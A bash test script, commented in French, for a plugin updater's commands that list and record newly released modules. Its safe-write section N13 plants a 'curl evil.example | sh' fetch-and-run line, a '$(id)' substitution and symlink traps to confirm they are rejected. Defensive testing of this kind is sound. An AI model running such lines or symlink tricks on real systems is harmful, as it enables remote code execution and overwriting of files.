#!/usr/bin/env bash
# test-vibeflow-update-nouveaux-modules.sh — /vf-update propose les modules apparus dans une release.
# Chaque cas exige d'abord que le verbe RÉUSSISSE (rc=0) et que chaque ligne ait la forme `module=vX…` :
# sans le correctif, le rouge vient de l'absence de la propriété, jamais d'un texte d'usage sur stdout.
#   N1  registre sans cockpit face au catalogue COURANT du dépôt → cockpit proposé
#   N1b le même catalogue : un module `proposable:false` (product-team-bundle) n'est jamais proposé
#   N2  un module déjà au registre n'est jamais proposé
#   N3  lab non posé (pas de registre) → rien à proposer, rien d'écrit
#   N4  après mark-offered : plus rien ; un module apparu ENSUITE est proposé, lui seul
#   N5  module retiré exprès (inscrit comme proposé, absent du registre) → jamais reproposé
#   N6  new-modules est en lecture seule (aucun fichier écrit)
#   N7  proposable:false jamais proposé (fixture), proposable:true l'est
#   N8  le poste est lu dans le fichier du lab (vibeflow-role) quand VF_ROLE est vide ; fichier invalide → erreur, rien listé
#   N9  mark-offered n'inscrit que les modules présentés (union), pas le catalogue ; sans argument rien n'est écrit
#   N10 bout en bout vf-update-run.sh + VRAI engine : cockpit listé, registre inchangé, rien posé ; offer sans module →
#       registre inchangé, cockpit inscrit ; offer cockpit → cockpit au registre
#   N11 jamais en double : un module posé dans un scope n'est pas proposé dans l'autre ; absent des deux → listé dans chacun
#   N12 /vibeflow-install inscrit ce qu'il laisse non posé : lab neuf → new-modules ne dit rien (witness + skill)
#   N10f les dépendances non posées sont nommées (deps=…) dans NOUVEAU_MODULE
# VF_NM_TEST_ENGINE : engine de substitution (mutant). VF_NM_TEST_RUN : vf-update-run.sh de substitution (N10).
# Exit 1 dès qu'un KO est compté ; aucun cas exécuté → exit 1.
set -uo pipefail
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
TESTS_DIR="$(cd "$(dirname "$0")" && pwd)"
INTERNAL_DIR="$(cd "$TESTS_DIR/.." && pwd)"
REPO="$(cd "$INTERNAL_DIR/.." && pwd)"
ENGINE="${VF_NM_TEST_ENGINE:-$INTERNAL_DIR/vibeflow-update.sh}"
RUNNER="${VF_NM_TEST_RUN:-$REPO/conductor/scripts/vf-update-run.sh}"
pass=0; fail=0
ok() { echo "  ✓ $1"; pass=$((pass+1)); }
ko() { echo "  ✗ $1"; fail=$((fail+1)); }

WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT
FH="$WORK/home"; LAB="$WORK/lab"; mkdir -p "$FH" "$LAB/.claude/scripts"
REG="$LAB/.claude/scripts/.vibeflow-installed"
OFFERED="$LAB/.claude/scripts/.vibeflow-offered"
ROLEFILE="$LAB/.claude/vibeflow-role"
echo "== test-vibeflow-update-nouveaux-modules (engine: $ENGINE) =="

# eng <cache> <verbe…> : stdout du verbe seul ; le code de sortie est dans ENG_RC (appel sans sous-shell : eng_out)
ENG_RC=0; ENG_OUT=""
eng() {
  local cache="$1"; shift
  ENG_OUT="$(cd "$LAB" && HOME="$FH" VIBEFLOW_CACHE="$cache" bash "$ENGINE" --scope project "$@" 2>"$WORK/eng.err")"; ENG_RC=$?
}
# lignes_ok : rc=0 ET chaque ligne non vide a la forme module=vX (sortie vide admise : ENG_RC reste exigé)
lignes_ok() {
  [ "$ENG_RC" -eq 0 ] || return 1
  local l
  while IFS= read -r l; do
    [ -z "$l" ] && continue
    [[ "$l" =~ ^[a-z0-9-]+=v[0-9][0-9A-Za-z._+-]*$ ]] || return 1
  done <<< "$ENG_OUT"
  return 0
}
# aff : première ligne de sortie, tronquée, pour les messages de KO
aff() { printf '%s' "$ENG_OUT" | head -1 | cut -c1-70; }

catalogue() { for d in "$REPO"/*/; do n=$(basename "$d"); [ "$n" = _internal ] && continue; [ -f "${d}VERSION" ] && echo "$n"; done; }
# Registre = tout le catalogue courant SAUF cockpit et le bundle non proposable (l'état réel d'un lab mis à jour en v2.75.x)
catalogue | grep -vx -e cockpit -e product-team-bundle | while IFS= read -r m; do echo "$m=$(cat "$REPO/$m/VERSION")"; done > "$REG"
[ "$(catalogue | grep -cx cockpit)" = 1 ] || { echo "précondition : cockpit absent du catalogue courant"; exit 1; }
grep -q '"proposable": false' "$REPO/product-team-bundle/module.json" || { echo "précondition : product-team-bundle n'est plus proposable:false"; exit 1; }

# ---- N1 / N1b / N2 / N6 : catalogue courant ----------------------------------------------------------
eng "$REPO" new-modules
if lignes_ok && printf '%s\n' "$ENG_OUT" | grep -qx "cockpit=$(cat "$REPO/cockpit/VERSION")"; then ok "N1 : cockpit proposé (registre sans cockpit, catalogue courant)"; else ko "N1 : cockpit non proposé — rc=$ENG_RC sortie : [$(aff)]"; fi
if lignes_ok && ! printf '%s\n' "$ENG_OUT" | grep -q '^product-team-bundle='; then ok "N1b : un module proposable:false n'est pas proposé"; else ko "N1b : product-team-bundle proposé malgré proposable:false — rc=$ENG_RC sortie : [$(aff)]"; fi
if lignes_ok && ! printf '%s\n' "$ENG_OUT" | grep -qx 'conductor=.*'; then ok "N2 : un module du registre n'est pas proposé"; else ko "N2 : conductor (déjà au registre) proposé, ou verbe en échec — rc=$ENG_RC [$(aff)]"; fi
if lignes_ok && [ ! -e "$OFFERED" ]; then ok "N6 : new-modules n'écrit rien"; else ko "N6 : new-modules a écrit $OFFERED (ou verbe en échec, rc=$ENG_RC)"; fi

# ---- fixture : cache contrôlé (modules + réel lecteur de poste et prédicat de vue) ---------------------
mkmod() { # <cache> <nom> <version> [lignes json supplémentaires]
  mkdir -p "$1/$2"; echo "$3" > "$1/$2/VERSION"
  printf '{ "name": "%s", "version": "%s", "type": "doc-only", "description": "fixture"%s, "requires": [] }\n' "$2" "$3" "${4:+, $4}" > "$1/$2/module.json"
}
mkcache() { # <dir> : conductor (lecteur de poste réel) + _internal/module-roles.sh réel
  mkdir -p "$1/_internal" "$1/conductor/scripts"
  cp "$INTERNAL_DIR/module-roles.sh" "$1/_internal/module-roles.sh"
  cp "$REPO/conductor/scripts/vf-role.sh" "$1/conductor/scripts/vf-role.sh"
  mkmod "$1" conductor v1.0.0
}
reset_lab() { rm -f "$OFFERED" "$ROLEFILE"; printf 'conductor=v1.0.0\n' > "$REG"; }

# ---- N4 : mark-offered puis module apparu ensuite ---------------------------------------------------------
reset_lab
CACHE2="$WORK/cache2"; mkcache "$CACHE2"; mkmod "$CACHE2" cockpit v1.0.1
eng "$CACHE2" new-modules
[ "$ENG_OUT" = "cockpit=v1.0.1" ] && [ "$ENG_RC" -eq 0 ] || { echo "précondition N4 : fixture illisible rc=$ENG_RC [$(aff)]"; exit 1; }
eng "$CACHE2" mark-offered cockpit
[ "$ENG_RC" -eq 0 ] || ko "N4 : mark-offered en échec (rc=$ENG_RC) : $(head -1 "$WORK/eng.err" | cut -c1-80)"
eng "$CACHE2" new-modules
if lignes_ok && [ -z "$ENG_OUT" ]; then ok "N4a : après mark-offered, plus rien à proposer"; else ko "N4a : encore proposé ou verbe en échec : rc=$ENG_RC [$(aff)]"; fi
mkmod "$CACHE2" nouveau v1.0.0
eng "$CACHE2" new-modules
if lignes_ok && [ "$ENG_OUT" = "nouveau=v1.0.0" ]; then ok "N4b : un module apparu ensuite est proposé, lui seul"; else ko "N4b : attendu 'nouveau=v1.0.0', reçu rc=$ENG_RC [$(aff)]"; fi

# ---- N5 : retiré exprès ----------------------------------------------------------------------------
# cockpit est inscrit comme proposé (N4) et absent du registre : refusé ou retiré, jamais reproposé
if lignes_ok && [ -n "$ENG_OUT" ] && ! printf '%s\n' "$ENG_OUT" | grep -qx 'cockpit=.*'; then ok "N5 : module refusé ou retiré exprès non reproposé"; else ko "N5 : cockpit reproposé malgré l'inscription, ou verbe en échec : rc=$ENG_RC [$(aff)]"; fi

# ---- N7 : proposable:false (fixture) ----------------------------------------------------------------------
reset_lab
CACHE3="$WORK/cache3"; mkcache "$CACHE3"; mkmod "$CACHE3" wip v1.0.0 '"proposable": false'; mkmod "$CACHE3" fini v1.0.0 '"proposable": true'
eng "$CACHE3" new-modules
if lignes_ok && [ "$ENG_OUT" = "fini=v1.0.0" ]; then ok "N7 : proposable:false jamais proposé, proposable:true l'est"; else ko "N7 : attendu 'fini=v1.0.0', reçu rc=$ENG_RC [$(printf '%s' "$ENG_OUT" | tr '\n' ' ' | cut -c1-70)]"; fi

# ---- N8 : poste lu dans le fichier du lab ----------------------------------------------------------------
reset_lab
CACHE4="$WORK/cache4"; mkcache "$CACHE4"
mkmod "$CACHE4" pour-dev v1.0.0 '"roles": ["dev"]'; mkmod "$CACHE4" pour-produit v1.0.0 '"roles": ["product"]'; mkmod "$CACHE4" pour-tous v1.0.0
rep() { printf '%s' "$ENG_OUT" | tr '\n' ' ' | cut -c1-90; }
printf 'product\n' > "$ROLEFILE"; eng "$CACHE4" new-modules
if lignes_ok && [ "$ENG_OUT" = "$(printf 'pour-produit=v1.0.0\npour-tous=v1.0.0')" ]; then ok "N8a : poste product (fichier du lab) → pour-produit et pour-tous seuls"; else ko "N8a : attendu pour-produit+pour-tous, reçu rc=$ENG_RC [$(rep)]"; fi
printf 'dev\n' > "$ROLEFILE"; eng "$CACHE4" new-modules
if lignes_ok && [ "$ENG_OUT" = "$(printf 'pour-dev=v1.0.0\npour-tous=v1.0.0')" ]; then ok "N8b : poste dev (fichier du lab) → pour-dev et pour-tous seuls"; else ko "N8b : attendu pour-dev+pour-tous, reçu rc=$ENG_RC [$(rep)]"; fi
rm -f "$ROLEFILE"; eng "$CACHE4" new-modules
if lignes_ok && [ "$(printf '%s\n' "$ENG_OUT" | wc -l | tr -d ' ')" = 3 ]; then ok "N8c : sans fichier de poste (solo), les trois sont proposés"; else ko "N8c : attendu 3 modules, reçu rc=$ENG_RC [$(rep)]"; fi
printf 'nimporte-quoi\n' > "$ROLEFILE"; eng "$CACHE4" new-modules
if [ "$ENG_RC" -ne 0 ] && [ -z "$ENG_OUT" ]; then ok "N8d : fichier de poste invalide → erreur, aucun module listé (jamais « visible »)"; else ko "N8d : poste invalide toléré : rc=$ENG_RC [$(rep)]"; fi
rm -f "$ROLEFILE"

# ---- N9 : mark-offered n'inscrit que les modules présentés -----------------------------------------------
reset_lab
CACHE5="$WORK/cache5"; mkcache "$CACHE5"; mkmod "$CACHE5" alpha v1.0.0; mkmod "$CACHE5" beta v1.0.0; mkmod "$CACHE5" gamma v1.0.0
eng "$CACHE5" mark-offered
if [ "$ENG_RC" -eq 0 ] && [ ! -e "$OFFERED" ]; then ok "N9a : sans module présenté, rien n'est écrit"; else ko "N9a : rc=$ENG_RC, fichier $( [ -e "$OFFERED" ] && echo écrit || echo absent)"; fi
eng "$CACHE5" mark-offered alpha
if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED" 2>/dev/null)" = "alpha" ]; then ok "N9b : seul le module présenté est inscrit (pas le catalogue)"; else ko "N9b : attendu 'alpha', reçu rc=$ENG_RC [$(tr '\n' ' ' < "$OFFERED" 2>/dev/null)]"; fi
eng "$CACHE5" mark-offered gamma
if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED" 2>/dev/null)" = "$(printf 'alpha\ngamma')" ]; then ok "N9c : l'inscription s'ajoute à l'existant (union)"; else ko "N9c : attendu alpha+gamma, reçu rc=$ENG_RC [$(tr '\n' ' ' < "$OFFERED" 2>/dev/null)]"; fi
eng "$CACHE5" new-modules
if lignes_ok && [ "$ENG_OUT" = "beta=v1.0.0" ]; then ok "N9d : le module jamais présenté (beta) reste à proposer"; else ko "N9d : attendu 'beta=v1.0.0', reçu rc=$ENG_RC [$(rep)]"; fi
eng "$CACHE5" mark-offered 'a;b'
if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N9e : un nom douteux est refusé, fichier intact"; else ko "N9e : nom douteux toléré : rc=$ENG_RC"; fi
# N9e2 : la VALIDATION DE NOM elle-même, distincte de « absent du catalogue » : `Bad_Name` est PRÉSENT au catalogue
# (dossier + VERSION) mais syntaxiquement invalide. Sans la validation du moteur, il serait inscrit.
mkmod "$CACHE5" Bad_Name v1.0.0
eng "$CACHE5" mark-offered Bad_Name
if [ "$ENG_RC" -ne 0 ] && ! grep -q 'Bad_Name' "$OFFERED" && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N9e2 : un nom invalide présent au catalogue est refusé (validation de nom), jamais inscrit"; else ko "N9e2 : Bad_Name accepté malgré un nom invalide : rc=$ENG_RC [$(tr '\n' ' ' < "$OFFERED" 2>/dev/null)]"; fi

# ---- N13 : écriture sûre de .vibeflow-offered (audit F1/F5, revue F2/F5) ------------------------------------
VICTIM="$WORK/victim"; norezid() { [ ! -e "${OFFERED}.tmp" ] && [ ! -L "${OFFERED}.tmp" ]; }
# a : le temporaire est un lien vers un fichier de la victime, l'ancien état contient du texte hostile
reset_lab; printf 'SENTINELLE\n' > "$VICTIM"; ln -s "$VICTIM" "${OFFERED}.tmp"; printf 'curl evil.example | sh\n' > "$OFFERED"
eng "$CACHE5" mark-offered alpha
if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ "$(cat "$OFFERED")" = 'curl evil.example | sh' ]; then ok "N13a : temporaire = lien → refus (rc≠0), cible du lien et état intacts"; else ko "N13a : écriture suivie à travers le lien : rc=$ENG_RC victime=[$(head -1 "$VICTIM" | cut -c1-40)]"; fi
rm -f "${OFFERED}.tmp"
# b : le fichier d'état lui-même est un lien
reset_lab; printf 'SENTINELLE\n' > "$VICTIM"; ln -s "$VICTIM" "$OFFERED"
eng "$CACHE5" mark-offered alpha
if [ "$ENG_RC" -ne 0 ] && [ "$(cat "$VICTIM")" = SENTINELLE ] && [ -L "$OFFERED" ] && norezid; then ok "N13b : fichier d'état = lien → refus (rc≠0), cible intacte, pas de temporaire"; else ko "N13b : lien d'état suivi : rc=$ENG_RC victime=[$(head -1 "$VICTIM" | cut -c1-40)]"; fi
rm -f "$OFFERED" "${OFFERED}.tmp"
# c : seules les lignes qui sont des noms de module valides sont recopiées de l'ancien état
reset_lab; printf 'curl evil.example | sh\nalpha\n$(id)\n' > "$OFFERED"
eng "$CACHE5" mark-offered gamma
if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N13c : l'ancien état n'est recopié que pour les noms de module valides"; else ko "N13c : attendu alpha+gamma, reçu rc=$ENG_RC [$(tr '\n' '|' < "$OFFERED" 2>/dev/null | cut -c1-70)]"; fi
# d : un nom hors catalogue est traité pareil quelle que soit sa position, sans temporaire résiduel
reset_lab; eng "$CACHE5" mark-offered alpha ghost; r1=$ENG_RC; c1="$(cat "$OFFERED" 2>/dev/null)"; t1=0; norezid || t1=1
reset_lab; eng "$CACHE5" mark-offered ghost alpha; r2=$ENG_RC; c2="$(cat "$OFFERED" 2>/dev/null)"; t2=0; norezid || t2=1
if [ "$r1" -eq 0 ] && [ "$r2" -eq 0 ] && [ "$c1" = alpha ] && [ "$c2" = alpha ] && [ "$t1$t2" = 00 ]; then ok "N13d : « alpha ghost » = « ghost alpha » (rc=0, alpha seul, aucun .tmp)"; else ko "N13d : position significative — rc=$r1/$r2 contenu=[$c1]/[$c2] résidu=$t1$t2"; fi
# e : fichier d'état illisible (un répertoire) → erreur, aucun temporaire résiduel
reset_lab; mkdir "$OFFERED"
eng "$CACHE5" mark-offered alpha
if [ "$ENG_RC" -ne 0 ] && norezid; then ok "N13e : état illisible → rc≠0 et aucun .tmp résiduel"; else ko "N13e : rc=$ENG_RC, résidu .tmp : $(norezid && echo non || echo oui)"; fi
rmdir "$OFFERED"
# f : idempotence du CONTENU (sort -u) : deux inscriptions identiques ne dupliquent rien
reset_lab; eng "$CACHE5" mark-offered gamma alpha; eng "$CACHE5" mark-offered alpha gamma alpha
if [ "$ENG_RC" -eq 0 ] && [ "$(cat "$OFFERED")" = "$(printf 'alpha\ngamma')" ]; then ok "N13f : contenu idempotent et trié (alpha, gamma — une ligne chacun)"; else ko "N13f : attendu alpha+gamma sans doublon, reçu [$(tr '\n' '|' < "$OFFERED" 2>/dev/null)]"; fi
# g : --pending dont le calcul échoue (poste illisible) : rc≠0, rien d'écrit
reset_lab; printf 'nimporte-quoi\n' > "$ROLEFILE"
eng "$CACHE5" mark-offered --pending
if [ "$ENG_RC" -ne 0 ] && [ ! -e "$OFFERED" ] && norezid; then ok "N13g : mark-offered --pending, calcul en échec → rc≠0, rien d'écrit"; else ko "N13g : échec du calcul masqué : rc=$ENG_RC fichier=$( [ -e "$OFFERED" ] && echo écrit || echo absent)"; fi
rm -f "$ROLEFILE"

# ---- N3 : lab non posé ----------------------------------------------------------------------------
rm -f "$REG" "$OFFERED"
eng "$REPO" new-modules; r1=$ENG_RC; o1="$ENG_OUT"
eng "$REPO" mark-offered cockpit
if [ "$r1" -eq 0 ] && [ -z "$o1" ] && [ "$ENG_RC" -eq 0 ] && [ ! -e "$OFFERED" ]; then ok "N3 : sans registre, rien proposé ni écrit"; else ko "N3 : rc=$r1/$ENG_RC, sortie non vide ou fichier écrit"; fi

# ---- N10 : bout en bout, vf-update-run.sh + VRAI engine ----------------------------------------------------
# VF_CACHE_BASE jetable dont un dossier version reprend le dépôt (modules en liens, _internal copié pour porter
# l'engine sous test, conductor copié pour neutraliser le contrôle réseau du bandeau).
BASE="$WORK/base"; V="$BASE/9.9.9"; mkdir -p "$V"
for d in "$REPO"/*/; do n=$(basename "$d"); case "$n" in _internal|conductor) ;; *) ln -s "${d%/}" "$V/$n" ;; esac; done
cp -R "$REPO/_internal" "$V/_internal"; cp "$ENGINE" "$V/_internal/vibeflow-update.sh"
cp -R "$REPO/conductor" "$V/conductor"; printf '#!/usr/bin/env bash\nexit 1\n' > "$V/conductor/scripts/check-plugin-update.sh"
cp "$RUNNER" "$V/conductor/scripts/vf-update-run-sous-test.sh"
E2E="$WORK/e2e"; EH="$WORK/e2e-home"; mkdir -p "$E2E/.claude/scripts" "$EH" "$WORK/xdg"
catalogue | grep -vx -e cockpit -e product-team-bundle | while IFS= read -r m; do echo "$m=$(cat "$REPO/$m/VERSION")"; done > "$E2E/.claude/scripts/.vibeflow-installed"
E2E_REG="$E2E/.claude/scripts/.vibeflow-installed"; REG_SUM="$(cksum < "$E2E_REG")"
run_e2e() { (cd "$E2E" && HOME="$EH" XDG_CACHE_HOME="$WORK/xdg" VF_CACHE_BASE="$BASE" bash "$V/conductor/scripts/vf-update-run-sous-test.sh" "$@" 2>&1); }
out="$(run_e2e --scope project)"
if printf '%s\n' "$out" | grep -qx "\[vf-update-run\] NOUVEAU_MODULE scope=project cockpit=$(cat "$REPO/cockpit/VERSION") deps=-" \
   && ! printf '%s\n' "$out" | grep -q 'NOUVEAU_MODULE.*product-team-bundle'; then ok "N10a : cockpit listé en NOUVEAU_MODULE (le bundle non proposable ne l'est pas)"; else ko "N10a : NOUVEAU_MODULE cockpit absent : [$(printf '%s' "$out" | grep NOUVEAU | head -2 | tr '\n' ' ' | cut -c1-90)]"; fi
if [ "$(cksum < "$E2E_REG")" = "$REG_SUM" ] && ! grep -q '^cockpit=' "$E2E_REG" && [ ! -e "$E2E/.claude/scripts/.vibeflow-offered" ]; then ok "N10b : registre inchangé, aucun module posé, rien d'inscrit à la liste"; else ko "N10b : registre modifié ou module posé / offered écrit (listing seul)"; fi
out="$(run_e2e offer project)"
if [ "$(cksum < "$E2E_REG")" = "$REG_SUM" ] && grep -qx cockpit "$E2E/.claude/scripts/.vibeflow-offered" 2>/dev/null && ! grep -qx product-team-bundle "$E2E/.claude/scripts/.vibeflow-offered"; then ok "N10c : offer sans module → registre inchangé, cockpit inscrit (seul présenté)"; else ko "N10c : registre changé ou cockpit non inscrit : offered=[$(tr '\n' ' ' < "$E2E/.claude/scripts/.vibeflow-offered" 2>/dev/null | cut -c1-70)]"; fi
rm -f "$E2E/.claude/scripts/.vibeflow-offered"
out="$(run_e2e offer project cockpit)"
if grep -q '^cockpit=' "$E2E_REG" && grep -qx cockpit "$E2E/.claude/scripts/.vibeflow-offered" 2>/dev/null; then ok "N10d : offer project cockpit → cockpit au registre et inscrit"; else ko "N10d : cockpit absent du registre ou non inscrit : [$(printf '%s' "$out" | tail -2 | tr '\n' ' ' | cut -c1-90)]"; fi
# N10e : un module accepté puis désinstallé plus tard n'est jamais reproposé (il faisait partie des présentés)
(cd "$E2E" && HOME="$EH" VIBEFLOW_CACHE="$V" bash "$V/_internal/vibeflow-update.sh" --scope project uninstall cockpit >/dev/null 2>&1)
lst="$(cd "$E2E" && HOME="$EH" VIBEFLOW_CACHE="$V" bash "$V/_internal/vibeflow-update.sh" --scope project new-modules 2>/dev/null)"; lrc=$?
if ! grep -q '^cockpit=' "$E2E_REG" && [ "$lrc" -eq 0 ] && ! printf '%s\n' "$lst" | grep -q '^cockpit='; then ok "N10e : accepté puis désinstallé, cockpit n'est pas reproposé"; else ko "N10e : cockpit reproposé après désinstallation (rc=$lrc) [$(printf '%s' "$lst" | head -1 | cut -c1-60)]"; fi

# N10f : BL35-Q3, les dépendances non posées sont nommées dans NOUVEAU_MODULE (format stable `deps=<a,b|->`)
grep -vx -e 'mobile-test-team=.*' -e 'mobile-test=.*' "$E2E_REG" > "$WORK/reg.tmp" && cp "$WORK/reg.tmp" "$E2E_REG"
out="$(run_e2e --scope project)"
if printf '%s\n' "$out" | grep -qx "\[vf-update-run\] NOUVEAU_MODULE scope=project mobile-test-team=$(cat "$REPO/mobile-test-team/VERSION") deps=mobile-test"; then ok "N10f : mobile-test-team annonce « deps=mobile-test » (format stable)"; else ko "N10f : ligne mobile-test-team sans deps=mobile-test : [$(printf '%s' "$out" | grep 'NOUVEAU.*mobile-test-team' | head -1 | cut -c1-110)]"; fi

# ---- N11 : jamais en double entre user et project (BL35-Q2) ----------------------------------------------------
engs() { # <scope> <cache> <verbe…> : mêmes HOME/lab que eng, scope au choix
  local sc="$1" cache="$2"; shift 2
  ENG_OUT="$(cd "$LAB" && HOME="$FH" VIBEFLOW_CACHE="$cache" bash "$ENGINE" --scope "$sc" "$@" 2>"$WORK/eng.err")"; ENG_RC=$?
}
UREG="$FH/.claude/scripts/.vibeflow-installed"; mkdir -p "$FH/.claude/scripts"
CACHE6="$WORK/cache6"; mkcache "$CACHE6"; mkmod "$CACHE6" duo v1.0.0
rm -f "$OFFERED" "$FH/.claude/scripts/.vibeflow-offered"
printf 'conductor=v1.0.0\nduo=v1.0.0\n' > "$UREG"; printf 'conductor=v1.0.0\n' > "$REG"
engs project "$CACHE6" new-modules
if lignes_ok && [ -z "$ENG_OUT" ]; then ok "N11a : posé en user → non proposé en project"; else ko "N11a : duo (posé en user) proposé en project : rc=$ENG_RC [$(aff)]"; fi
printf 'conductor=v1.0.0\n' > "$UREG"; printf 'conductor=v1.0.0\nduo=v1.0.0\n' > "$REG"
engs user "$CACHE6" new-modules
if lignes_ok && [ -z "$ENG_OUT" ]; then ok "N11b : posé en project → non proposé en user"; else ko "N11b : duo (posé en project) proposé en user : rc=$ENG_RC [$(aff)]"; fi
printf 'conductor=v1.0.0\n' > "$REG"
engs user "$CACHE6" new-modules; ru="$ENG_OUT"; cu=$ENG_RC
engs project "$CACHE6" new-modules
if [ "$cu" -eq 0 ] && [ "$ru" = "duo=v1.0.0" ] && lignes_ok && [ "$ENG_OUT" = "duo=v1.0.0" ]; then ok "N11c : absent des deux scopes → listé dans les deux"; else ko "N11c : attendu duo dans user et project, reçu user=[$ru] project=[$(aff)]"; fi
rm -f "$UREG"

# ---- N12 : l'installeur inscrit ce qu'il laisse non posé (BL35-Q1-bis) ------------------------------------------------
# Chemin d'install réel (engine install --with-deps), puis l'inscription que prescrit installer/SKILL.md.
CACHE7="$WORK/cache7"; mkcache "$CACHE7"; mkmod "$CACHE7" ecarte v1.0.0
INSTALLER_SKILL="$REPO/installer/SKILL.md"
# La pose passe toujours par le VRAI engine (un mutant d'engine vit hors du dépôt, sans ses bibliothèques voisines) ;
# l'inscription et la liste, elles, passent par l'engine sous test.
fresh() {
  rm -rf "$LAB/.claude"; mkdir -p "$LAB/.claude"
  ENG_OUT="$(cd "$LAB" && HOME="$FH" VIBEFLOW_CACHE="$CACHE7" bash "$INTERNAL_DIR/vibeflow-update.sh" --scope project install --with-deps conductor 2>"$WORK/eng.err")"; ENG_RC=$?
}
fresh
if [ "$ENG_RC" -eq 0 ] && [ -f "$REG" ]; then
  engs project "$CACHE7" new-modules
  [ "$ENG_OUT" = "ecarte=v1.0.0" ] && ok "N12a : sans inscription, un lab neuf reverrait le module écarté (témoin du défaut)" || ko "N12a : attendu 'ecarte=v1.0.0' avant inscription, reçu rc=$ENG_RC [$(aff)]"
  if grep -q 'mark-offered --pending' "$INSTALLER_SKILL"; then
    engs project "$CACHE7" mark-offered --pending; engs project "$CACHE7" new-modules
    if lignes_ok && [ -z "$ENG_OUT" ]; then ok "N12b : après l'inscription de l'installeur, new-modules ne dit rien"; else ko "N12b : module écarté reproposé après l'inscription : rc=$ENG_RC [$(aff)]"; fi
  else ko "N12b : installer/SKILL.md ne prescrit pas « mark-offered --pending » (inscription retirée)"; fi
else ko "N12 : install --with-deps en échec (rc=$ENG_RC) : $(head -1 "$WORK/eng.err" | cut -c1-80)"; fi

echo "== $pass ok, $fail ko =="
[ "$fail" -eq 0 ] && [ $((pass+fail)) -gt 0 ]
